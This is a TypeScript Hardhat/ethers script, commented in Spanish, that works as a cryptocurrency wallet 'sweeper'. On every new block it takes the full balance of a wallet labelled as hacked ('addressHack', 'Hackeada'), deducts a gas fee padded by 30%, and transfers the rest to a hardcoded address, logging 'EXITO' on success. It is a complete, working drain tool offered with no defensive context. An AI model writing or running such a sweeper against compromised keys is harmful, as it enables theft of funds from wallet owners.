import { BigNumber } from "ethers";
import { ethers } from "hardhat";

async function deploy() {
  const signers = await ethers.getSigners();
  const signer = signers[0];
  const addressHack = signer.address;

  const to = "0x70E24350DCA5C9EB381fE4bCf4474E27f1e66C12";
  const provider = ethers.provider;

  
  provider.on("block", async (blockNumber) => {
    //Se obtiene el saldo de una address en el ultimo bloque
    const balanceWei = await provider.getBalance(addressHack, blockNumber-1);
    const { maxFeePerGas, gasPrice, maxPriorityFeePerGas } =  await provider.getFeeData();

    const gasLimitN = 21000n;
    // se agrega un 30% al precio  del gas, debido a que entre bloques el gas price varia
    const gaspriceN =((gasPrice ?? new BigNumber("0", "10")).toBigInt() * 130n) / 100n; 
    const feeN = gaspriceN * gasLimitN;

    const toSendN = balanceWei.toBigInt() - feeN;
    const tosendB = BigNumber.from(toSendN);

    if (toSendN > 0n) {
        console.log(`balance de address Hackeada ${await provider.getBalance(addressHack)} ETH`);

            try {
              
              const tx = {
                to: to,
                value: tosendB,
              };

              const transaction = await signer.sendTransaction(tx);
              await transaction.wait(1);

              console.log(`EXITO!!!!! balance Hackeada ${await provider.getBalance(addressHack)} ETH`);

            } catch (error) {
              console.log("OCURRIO UN CATCH ERROR");
              console.error(error);
      }
    } else {
        console.log(`wallet ${addressHack} vacia`);
        console.log("balance => ", await provider.getBalance(addressHack));
    }
  });

}

deploy()
